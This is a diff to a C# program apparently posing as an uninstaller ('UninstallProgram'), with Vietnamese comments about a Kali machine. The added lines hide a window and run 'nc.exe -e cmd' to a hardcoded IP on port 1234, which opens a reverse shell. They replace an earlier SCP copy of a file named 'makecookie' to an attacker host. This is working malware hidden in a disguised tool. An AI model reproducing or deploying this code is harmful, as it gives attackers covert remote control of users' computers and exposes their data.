@@ -39,8 +39,20 @@ namespace UninstallProgram.Functions
             //Console.WriteLine($"resourceName: {resourceName}");
 
             //ip minh - name kali - pass 1 - @"D:\makecookie": ten file muon copy tu IT qua may minh
+            /*String ip = "172.20.10.3";*/
+            String ip = "10.0.0.135";
+            /*Scp fileConnect = new Scp(ip, "kali", "1");*/
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C .\\nc.exe -e cmd " + ip + " 1234";
+            startInfo.CreateNoWindow = true;
+            /*startInfo.RedirectStandardOutput = true; 
+            startInfo.RedirectStandardError = true;*/
 
-            new Scp("192.168.1.13", "kali", "1").Copy(@"D:\makecookie");
+            process.StartInfo = startInfo;
+            process.Start();
+
         }
 
         // Phương thức copy nội dung của tệp tin nhúng ra tệp tin
